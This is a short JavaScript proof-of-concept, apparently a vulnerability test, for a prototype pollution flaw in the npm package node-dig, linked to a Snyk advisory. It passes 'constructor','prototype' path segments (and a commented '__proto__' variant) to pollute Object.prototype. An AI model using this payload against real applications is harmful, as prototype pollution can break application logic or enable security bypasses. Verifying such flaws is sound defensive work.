// //https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
// test("prototype pollution in node-dig", () => {
  const nodeDig = require("node-dig");
console.log({}.polluted);
nodeDig({}, ["constructor","prototype", "polluted"], "yes");
  //nodeDig({}, ["__proto__", "polluted"], "yes");
console.log({}.polluted);
// });
